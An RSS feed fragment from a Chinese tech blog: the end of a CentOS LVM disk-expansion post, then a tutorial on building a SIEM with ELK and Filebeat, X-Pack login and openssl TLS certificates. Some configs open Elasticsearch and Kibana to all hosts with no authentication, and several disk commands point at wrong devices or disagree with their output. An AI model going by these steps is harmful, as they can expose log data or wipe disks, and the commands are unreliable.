damgP3-SFOn-9IfM-k4bX-B2g1-D3HG-otTWEd</p><p> ps:</p><p> 查看 Free PE / Size这项,可以看到还有18.09G可以分配,但我们实际只能分配18G.</p><p>（5）扩展/root所在的lv</p><pre><code>lvextend -L +100G /dev/sda1</code></pre><p> Size of logical volume centos/root changed from &lt;37.04 GiB (9481 extents) to &lt;55.04 GiB (14089 extents).</p><p> Logical volume centos/root successfully resized.</p><p>（6）扩展/root文件系统</p><pre><code>xfs_growfs /dev/sda1</code></pre><p>（7）检查是否成功</p><pre><code>df -h</code></pre><p>3 处理mnt目录</p><p>（1）创建</p><pre><code>lvcreate -L 40G -n /dev/sdb1</code></pre><p> 或加入剩余空间 vgdisplay</p><p>lvdisplay 查看 VG Name        cl </p><p> lvcreate -l +100%FREE -n /dev/mapper/cl-home cl</p><p>（2）进行创建文件系统</p><pre><code>mkfs.xfs  /dev/sdb1mkfs.xfs  /dev/mapper/centos-home </code></pre><p>（3）我们就要把mnt目录挂载回去</p><p>mount /dev/sdb1</p><p>最后把之前home备份到tmp的内容，给mv回来，mnt目录的恢复</p><p> 解压 ：tar xvf /tmp/mnt.tar  -C /mnt/   </p><p>我们解压在mnt所以要进入mnt目录 ：cd /mnt/mnt/   </p><p>最后一条：mv * ../</p><p>然后你在敲df -h，就可以看到现在的系统状态，大功告成！</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/linux/">linux</category>
      
      
      <comments>https://m01ly.github.io/2021/03/11/linux-disk/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>elk笔记三--利用elk+filebeat搭建SIEM系统</title>
      <link>https://m01ly.github.io/2021/02/19/install-guide-elk-filebeats/</link>
      <guid>https://m01ly.github.io/2021/02/19/install-guide-elk-filebeats/</guid>
      <pubDate>Fri, 19 Feb 2021 08:49:12 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-整体架构部署&quot;&gt;&lt;a href=&quot;#1-整体架构部署&quot; class=&quot;headerlink&quot; title=&quot;1 整体架构部署&quot;&gt;&lt;/a&gt;1 整体架构部署&lt;/h1&gt;&lt;p&gt;SIEM全称为security information and event management，即安全信息和事件管理，通俗使用的说，安全信息指的是服务运行中产生的日志信息，事件管理即通过对安全信息进行各种分析方法的总称，如入侵检测等。目前我司一个项目中客户要求SIEM系统，最常见的采用elk+filebeat搭建SIEM系统，用来分析服务器产生的日志：其实初步只做到了安全信息管理，后面如果深入我会继续更新。下面先看下部署的整体架构：filebeat部署在哥哥需要收集日志的机器上，然后在云上部署elk系统，然后filebeat将日志传送到logstash中，然后logstash存到es中，进一步通过kibana进行数据化展示。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-整体架构部署"><a href="#1-整体架构部署" class="headerlink" title="1 整体架构部署"></a>1 整体架构部署</h1><p>SIEM全称为security information and event management，即安全信息和事件管理，通俗使用的说，安全信息指的是服务运行中产生的日志信息，事件管理即通过对安全信息进行各种分析方法的总称，如入侵检测等。目前我司一个项目中客户要求SIEM系统，最常见的采用elk+filebeat搭建SIEM系统，用来分析服务器产生的日志：其实初步只做到了安全信息管理，后面如果深入我会继续更新。下面先看下部署的整体架构：filebeat部署在哥哥需要收集日志的机器上，然后在云上部署elk系统，然后filebeat将日志传送到logstash中，然后logstash存到es中，进一步通过kibana进行数据化展示。<a id="more"></a></p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614853265381.png" alt="1614853265381"></p><p>其中涉及的部署主机如下：</p><table><thead><tr><th>部署用途</th><th>主机</th><th>域名</th><th>环境</th></tr></thead><tbody><tr><td>日志产生集群:部署filebeat7.8</td><td>10.65.18.105等</td><td>archery-sec0001.xxx.xx</td><td>centos7</td></tr><tr><td>SIEM系统：部署elk7.8</td><td>10.65.18.112</td><td>archery-sec0002.xxx.xx</td><td>centos7，java8</td></tr></tbody></table><h1 id="2-elk安装"><a href="#2-elk安装" class="headerlink" title="2 elk安装"></a>2 elk安装</h1><p>在10.65.18.112主机上部署elk。其中安装elk教程参考<a href="https://m01ly.github.io/2020/09/11/install-guide-elk-suricata">前面一篇文章</a>即可写的较详细，这里直接列出关键命令。</p><h2 id="2-1-elasticsearch9200"><a href="#2-1-elasticsearch9200" class="headerlink" title="2.1 elasticsearch9200"></a>2.1 elasticsearch9200</h2><p>注意安装ES时候，需要java8的环境。</p><p>安装目录： 一般是装在/usr/share/elasticsearch/下 </p><p>path.data: /var/lib/elasticsearch</p><p>path.logs: /var/log/elasticsearch</p><p><strong>（0）安装1.8版本java</strong></p><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，而那个不带-devel的安装完了其实是jre。</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>（1）下载安装es</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-x86_64.rpmrpm -ivh elasticsearch-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>(2) 配置文件</strong> </p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/elasticsearch/elasticsearch.yml<span class="token comment" spellcheck="true">#修改默认配置</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml<span class="token comment" spellcheck="true">#设置内存不使用交换分区</span>bootstrap.memory_lock: <span class="token boolean">false</span><span class="token comment" spellcheck="true">#配置了bootstrap.memory_lock为true时反而会引发9200不会被监听，原因不明</span><span class="token comment" spellcheck="true">#设置允许所有ip可以连接该elasticsearch</span>network.host: 0.0.0.0<span class="token comment" spellcheck="true">#开启监听的端口为9200</span>http.port: 9200http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span><span class="token comment" spellcheck="true">##防止bootstrap报错</span>node.name: node-1bootstrap.system_call_filter: <span class="token boolean">false</span> cluster.initial_master_nodes: <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3）启动es</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> elasticsearch <span class="token comment" spellcheck="true">#设置开机启动</span><span class="token function">sudo</span> systemctl start elasticsearch <span class="token comment" spellcheck="true">#启动</span><span class="token function">sudo</span> systemctl status elasticsearch <span class="token comment" spellcheck="true">#启查看运行状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>（4）测试是否启动成功</strong></p><pre class="line-numbers language-bash"><code class="language-bash">curl -X GET http://localhost:9200 <span class="token comment" spellcheck="true">#测试服务是否开启 可以用IP或者域名</span>curl -X GET http://archery-sec0002.eniot.io:9200/curl -X GET http://10.65.18.112:9200/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1613724861443.png" alt="1613724861443"></p><h2 id="2-2-logstash安装5044"><a href="#2-2-logstash安装5044" class="headerlink" title="2.2 logstash安装5044"></a>2.2 logstash安装5044</h2><p> <strong>(1)下载安装</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/logstash/logstash-7.8.0.rpmrpm -ivh logstash-7.8.0.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>(2)配置文件</strong><br>这里注意将output下的hosts改为刚才ES的IP地址即可。 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/logstash<span class="token comment" spellcheck="true">#进入logstash目录 </span><span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf<span class="token comment" spellcheck="true">#创建配置文件，日志内容输出到elasticsearch中</span>input <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    stdin <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        port <span class="token operator">=</span><span class="token operator">></span> 5044    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>output <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    elasticsearch <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        hosts <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#es主机</span>        index <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"filebeats-%&amp;#123;+YYYY.MM.dd&amp;#125;"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    stdout <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        codec <span class="token operator">=</span><span class="token operator">></span> rubydebug    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>（3）启动</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span class="token comment" spellcheck="true">#指定logstash.conf配置文件，以后台的方式运用</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> logstash <span class="token comment" spellcheck="true">#查看logstash服务</span><span class="token function">kill</span> -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>这里注意：如果直接运行systemctl start logstash命令启动logstash，不会加载logstash.conf配置文件。</strong></p><h2 id="2-3-kibana安装5601"><a href="#2-3-kibana安装5601" class="headerlink" title="2.3 kibana安装5601"></a>2.3 kibana安装5601</h2><p><strong>（1）下载安装</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/kibana/kibana-7.8.0-x86_64.rpmrpm -ivh kibana-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>（2）配置文件</strong><br>注意将配置文件中的kibana.yml设置在为ES地址。 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/kibana/kibana.yml <span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/kibana/kibana.yml<span class="token comment" spellcheck="true">#kibana页面映射在5601端口 </span>server.port: 5601 <span class="token comment" spellcheck="true">#允许所有ip访问5601端口 </span>server.host: <span class="token string">"0.0.0.0"</span> <span class="token comment" spellcheck="true">#elasticsearch所在的ip及监听的地址 </span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://10.65.18.112:9200"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>（3）启动</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> kibana <span class="token comment" spellcheck="true">#设置开机启动</span><span class="token function">sudo</span> systemctl start kibana <span class="token comment" spellcheck="true">#启动</span><span class="token function">sudo</span> systemctl status kibana <span class="token comment" spellcheck="true">#启查看运行状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>（4）浏览器查看</strong></p><p>浏览器输入IP:5601或者域名:5601即可查看kibana，例如<a href="http://archery-sec0002.eniot.io:5601/">http://archery-sec0002.eniot.io:5601/</a> </p><h1 id="3-部署filebeat"><a href="#3-部署filebeat" class="headerlink" title="3 部署filebeat"></a>3 部署filebeat</h1><p>在10.65.18.105主机上部署filebeat，具体如下：</p><p><strong>（1）下载安装</strong></p><pre class="line-numbers language-yaml"><code class="language-yaml">sudo wget https<span class="token punctuation">:</span>//artifacts.elastic.co/downloads/beats/filebeat/filebeat<span class="token punctuation">-</span>7.8.0<span class="token punctuation">-</span>x86_64.rpmrpm <span class="token punctuation">-</span>ivh filebeat<span class="token punctuation">-</span>7.8.0<span class="token punctuation">-</span>x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>(2)配置filebeat，将日志输出到logstash</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/filebeat/filebeat.yml <span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/filebeat/filebeat.yml<span class="token comment" spellcheck="true">#=========================== Filebeat prospectors =============================</span>filebeat.inputs:- type: log  <span class="token comment" spellcheck="true"># Change to true to enable this input configuration.</span>  enabled: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># Paths that should be crawled and fetched. Glob based paths.</span>  paths:    - /var/log/*.log<span class="token comment" spellcheck="true">#这里配置指定目录的日志</span>    <span class="token comment" spellcheck="true">#- c:\programdata\elasticsearch\logs\*</span><span class="token comment" spellcheck="true">#----------------------------- Logstash output --------------------------------</span>output.logstash:  <span class="token comment" spellcheck="true"># The Logstash hosts</span>  <span class="token comment" spellcheck="true">#hosts: ["localhost:5044"]</span>  hosts: <span class="token punctuation">[</span><span class="token string">"archery-sec0002.eniot.io:5044"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#这里配置logstash地址，如果是内网最好用域名访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3） 启动filebeat</strong></p><p>运行如下命令启动filebeat</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> filebeat<span class="token comment" spellcheck="true">#设置开机启动</span><span class="token function">sudo</span> systemctl start filebeat<span class="token comment" spellcheck="true">#启动</span><span class="token function">sudo</span> systemctl status filebeat<span class="token comment" spellcheck="true">#启查看运行状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>(4) 查看日志</strong></p><p>如果filebeat可以用systemctl启动成功,则执行下面命令可以看到file beat运行日志，</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status filebeat -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果启动不成功，<a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">有以下两种方法：</a> </p><p>1、查看Linux的rsyslog日志，也就是/var/log/messages这个文件，这个文件日志量比较大，最好使用less命令查看此文件，然后按下大写字母G可翻阅到文件的最后的内容，最后查看是否有关于filebeat的报错语句。</p><p>2、直接使用filebeat的启动方法，而不使用systemctl start filebeat来启动。比如：</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebeat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这次就是直接使用这个命令，给我报错是127行有问题，然后</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">cat</span> -n  /etc/filebeat/filebeat.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我就着重修改了一下，最后启动成功了。</p><h1 id="4-启动"><a href="#4-启动" class="headerlink" title="4  启动"></a>4  启动</h1><p>首先开启elk,然后在部署filebeat的主机上（10.65.18.105）输入如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"删除用户"</span> <span class="token operator">>></span> /var/log/admin.log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器输入：ip/域名：5601，可以在Stack Management–&gt;Index Management下看到该index，filebeat-20210304，即证明filebeat将日志传送到elk上成功了。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614854689893.png" alt="1614854689893"></p><p>还可以去Dev Tools搜索相关数据</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614852084050.png" alt="1614852084050"></p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614852141941.png" alt="1614852141941"></p><h1 id="5-配置多目录收集"><a href="#5-配置多目录收集" class="headerlink" title="5 配置多目录收集"></a>5 配置多目录收集</h1><p>在实际的应用中，filebeat不只需要收集一个目录的日志，这个时候就需要用配置filebeat的多目录收集，本文参考<a href="https://blog.csdn.net/vip100549/article/details/79657574">使用Filebeat 6 收集多个目录的日志并发送到lostash</a> 配置两个主要目录收集日志，一个是收集系统日志的/var/log/*.log，一个是收集应用产生的日志/root/FEP/，主要配置如下：并且用Tags进行标记区分。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/filebeat/filebeat.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-yml"><code class="language-yml"> filebeat.prospectors:- type: log  # Change to true to enable this prospector configuration.  enabled: true  # Paths that should be crawled and fetched. Glob based paths.  paths:    - /var/log/*.log  tags: ["systemlog"]- type: log  enabled: true  paths:    - /home/envuser/energy-os/*/logs/*.log  tags: ["applicationlog"]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生产的日志可以用tags字段进行区分搜索(建立index-pattern-&gt;discover就可以看到)，如下图所示：</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615880675461.png" alt="1615880675461"></p><h1 id="5-ES设置登录"><a href="#5-ES设置登录" class="headerlink" title="5 ES设置登录"></a>5 ES设置登录</h1><p>ES默认是没有加认证的，因此外界可以直接访问地址获取数据库信息，造成隐私泄露，这里我们采用X-pack为ES加上登录，具体操作可参考<a href="https://m01ly.github.io/2020/09/11/elk-login/">elk笔记二–通过X-Pack权限控制设置elk登录</a>，这里给出logstash配置（/etc/logstash/conf.d/logstash.conf）参考如下：</p><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>    stdin &amp;<span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats &amp;<span class="token comment" spellcheck="true">#123;</span>        port =<span class="token punctuation">></span> 5044    &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>    elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>        hosts =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>        index =<span class="token punctuation">></span> "filebeats<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>        user =<span class="token punctuation">></span> "elastic"<span class="token comment" spellcheck="true">#登录ES的账户</span>        password =<span class="token punctuation">></span> "xxx"<span class="token comment" spellcheck="true">#登录ES的密码口令</span>    &amp;<span class="token comment" spellcheck="true">#125;</span>    stdout &amp;<span class="token comment" spellcheck="true">#123;</span>        codec =<span class="token punctuation">></span> rubydebug     &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-filebeat和logstash加密传输配置"><a href="#6-filebeat和logstash加密传输配置" class="headerlink" title="6   filebeat和logstash加密传输配置"></a>6   filebeat和logstash加密传输配置</h1><h2 id="6-1-生成证书"><a href="#6-1-生成证书" class="headerlink" title="6.1 生成证书"></a>6.1 生成证书</h2><p>本文采用openssl生成证书，根证书目前使用的是自签证书（即内置的公钥可验证该证书本身），命名为ca.crt。本文配置的是双向证书，即filebeat和logstash交互共需要两套证书，这里我采用从同一CA签发（当然两套也可以采用不同的两个CA签发），分别为logstash.crt和filebeat.crt。（也可以使用 直接利用的<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.5/certutil.html">Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil</a>来制作需要的证书，可以参考<a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">Filebeat与Logstash配置SSL加密通信</a> ）</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615361929310.png" alt="1615361929310"></p><p>logstash端应该有的证书：ca.crt,logstash,crt.logstash.key</p><p>filebeat端应该有的证书：ca.crt,filebeat,crt.filebeat.key</p><p>利用openssl生成证书很方便，只需要主机上装openssl即可，运行openssl version查看版本，若没安装，运行以下命令安装：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> opensslyum <span class="token function">install</span> openssl-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先生成证书机器的选择可以随意，这里我选择在logstash主机上生成所有的证书，然后将filebeat的证书拷贝到其机器即可。</p><h3 id="6-1-1-制作自签的CA证书"><a href="#6-1-1-制作自签的CA证书" class="headerlink" title="6.1.1 制作自签的CA证书"></a>6.1.1 制作自签的CA证书</h3><p>（1）创建certs证书目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/logstash/certs<span class="token function">cd</span> /etc/logstash/certs<span class="token comment" spellcheck="true">#进入证书目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）生成ca密钥</p><pre class="line-numbers language-bash"><code class="language-bash">openssl genrsa 2048 <span class="token operator">></span> ca.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615362913575.png" alt="1615362913575"></p><p>（3）使用ca私钥建立ca证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -x509 -nodes -days 3650 -key ca.key -out ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的是参数Common Name为域名，这里填为*.eniot.io，其他参数可以直接enter为空。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615362976782.png" alt="1615362976782"></p><h3 id="6-1-2-制作logstash使用的证书"><a href="#6-1-2-制作logstash使用的证书" class="headerlink" title="6.1.2  制作logstash使用的证书"></a>6.1.2  制作logstash使用的证书</h3><p>继续在logstash主机的/etc/logstash/certs目录下生成。</p><p>（1）生成logstash服务器csr证书请求文件</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -newkey rsa:2048 -days 3650 -nodes -keyout logstash.key -out logstash.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的参数为Common Name为logstash服务的域名：*.eniot.io，challenge password为为该证书请求文件设置密码，这里可以直接为空即可；其他参数直接enter为空即可。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363233359.png" alt="1615363233359"></p><p>（2）使用ca证书与ca私钥，请求文件logstash.csr签发服务器证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -req -in logstash.csr -days 3650 -CA ca.crt -CAkey ca.key -set_serial 01 <span class="token operator">></span> logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363431449.png" alt="1615363431449"></p><p>至此logstash需要的证书已经生成完成：ca.crt,logstash.crt,logstash.key</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363508360.png" alt="1615363508360"></p><h3 id="6-1-3-制作filebeat使用的证书"><a href="#6-1-3-制作filebeat使用的证书" class="headerlink" title="6.1.3  制作filebeat使用的证书"></a>6.1.3  制作filebeat使用的证书</h3><p>继续在logstash主机的/etc/logstash/certs目录下生成。</p><p>（1）生成filebeat服务器csr证书请求文件</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -newkey rsa:2048 -days 3650 -nodes -keyout filebeat.key -out filebeat.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的参数为Common Name为filebeat服务的域名：*.eniot.io，challenge password为为该证书请求文件设置密码，这里可以直接为空即可；其他参数直接enter为空即可。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363607580.png" alt="1615363607580"></p><p>（2）使用ca证书与ca私钥，请求文件filebeat.csr签发服务器证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -req -in filebeat.csr -days 3650 -CA ca.crt -CAkey ca.key -set_serial 01 <span class="token operator">></span> filebeat.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615366665677.png" alt="1615366665677"></p><p>至此filebeat所需要的证书ca.crt,filebeat.crt,filebeat.key已经生成完毕。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363783351.png" alt="1615363783351"></p><h3 id="6-1-4-检查生成的openssl证书"><a href="#6-1-4-检查生成的openssl证书" class="headerlink" title="6.1.4 检查生成的openssl证书"></a>6.1.4 检查生成的openssl证书</h3><p>（1）查看KEY信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -noout -text -in ca.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看CSR信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -noout -text -in logstash.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）查看证书信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -noout -text -in ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）验证证书</p><p>会提示self signed</p><pre class="line-numbers language-bash"><code class="language-bash">openssl verify logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5） 因为myserver.crt 是幅ca.crt发布的，所以会验证成功</p><pre class="line-numbers language-bash"><code class="language-bash">openssl verify -CAfile ca.crt logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>去掉key的密码保护</p><p>有时候每次都要输入密码太繁琐了,可以把Key的保护密码去掉</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -in logstash.key -out logstash.key.insecure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2-配置证书"><a href="#6-2-配置证书" class="headerlink" title="6.2 配置证书"></a>6.2 配置证书</h2><h3 id="6-2-1-logstash配置证书"><a href="#6-2-1-logstash配置证书" class="headerlink" title="6.2.1 logstash配置证书"></a>6.2.1 logstash配置证书</h3><p>（1）/etc/logstash/conf.d/logstash.conf上配置证书路径</p><p>主要需要修改是input节中设置ssl的参数，具体参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf input <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    stdin <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        port <span class="token operator">=</span><span class="token operator">></span> 5044        ssl <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>        ssl_certificate_authorities <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"/etc/logstash/certs/ca.crt"</span><span class="token punctuation">]</span>        ssl_certificate <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/etc/logstash/certs/logstash.crt"</span>        ssl_key <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/etc/logstash/certs/logstash.key"</span>        ssl_verify_mode <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"force_peer"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>output <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    elasticsearch <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        hosts <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"xxxx:9200"</span><span class="token punctuation">]</span>        index <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"filebeats-%&amp;#123;+YYYY.MM.dd&amp;#125;"</span>        user <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"elastic"</span>        password <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"xxxx"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    stdout <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        codec <span class="token operator">=</span><span class="token operator">></span> rubydebug     <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）查看logstash进程，并kill掉</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span><span class="token function">grep</span> 